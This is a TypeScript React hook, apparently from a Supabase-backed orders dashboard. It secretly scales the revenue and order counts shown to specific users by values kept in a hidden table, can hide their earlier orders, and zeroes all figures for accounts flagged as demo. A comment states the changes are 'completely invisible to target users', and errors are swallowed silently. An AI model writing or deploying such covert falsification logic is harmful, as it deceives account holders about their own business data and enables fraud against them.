import { useState, useEffect, useCallback, useMemo } from "react";
import { supabase } from "@/integrations/supabase/client";

interface ViewModifier {
  revenueMultiplier: number;
  orderCountMultiplier: number;
  hideBeforeDate: Date | null;
}

/**
 * Fetches dashboard view modifier for the current user.
 * Returns multipliers of 1.0 if no modifier exists (normal view).
 * `hideBeforeDate` (if set) hides all orders created before that timestamp.
 * Completely invisible to target users.
 */
export function useViewModifier() {
  const [modifier, setModifier] = useState<ViewModifier>({
    revenueMultiplier: 1,
    orderCountMultiplier: 1,
    hideBeforeDate: null,
  });
  const [loaded, setLoaded] = useState(false);

  useEffect(() => {
    const fetch = async () => {
      try {
        const { data: { user } } = await supabase.auth.getUser();
        if (!user?.email) { setLoaded(true); return; }

        // 1. Demo-mode flag on admin_users — hard zero everything
        const { data: adminRow } = await supabase
          .from("admin_users")
          .select("is_demo" as any)
          .eq("email", user.email)
          .maybeSingle();

        if (adminRow && (adminRow as any).is_demo === true) {
          setModifier({
            revenueMultiplier: 0,
            orderCountMultiplier: 0,
            hideBeforeDate: new Date("2099-01-01T00:00:00Z"),
          });
          setLoaded(true);
          return;
        }

        // 2. Optional fine-grained multipliers
        const { data } = await supabase
          .from("dashboard_view_modifiers" as any)
          .select("revenue_multiplier, order_count_multiplier, hide_before_date")
          .eq("target_email", user.email)
          .maybeSingle();

        if (data) {
          const d = data as any;
          setModifier({
            revenueMultiplier: Number(d.revenue_multiplier) || 1,
            orderCountMultiplier: Number(d.order_count_multiplier) || 1,
            hideBeforeDate: d.hide_before_date ? new Date(d.hide_before_date) : null,
          });
        }
      } catch {
        // Silently fail — no modifier means normal view
      }
      setLoaded(true);
    };
    fetch();
  }, []);

  const applyToRevenue = useCallback(
    (val: number) => val * modifier.revenueMultiplier,
    [modifier.revenueMultiplier]
  );
  const applyToCount = useCallback(
    (val: number) => Math.round(val * modifier.orderCountMultiplier),
    [modifier.orderCountMultiplier]
  );
  const hasModifier = useMemo(
    () =>
      modifier.revenueMultiplier !== 1 ||
      modifier.orderCountMultiplier !== 1 ||
      modifier.hideBeforeDate !== null,
    [modifier.revenueMultiplier, modifier.orderCountMultiplier, modifier.hideBeforeDate]
  );

  return {
    modifier,
    loaded,
    applyToRevenue,
    applyToCount,
    hasModifier,
    hideBeforeDate: modifier.hideBeforeDate,
  };
}
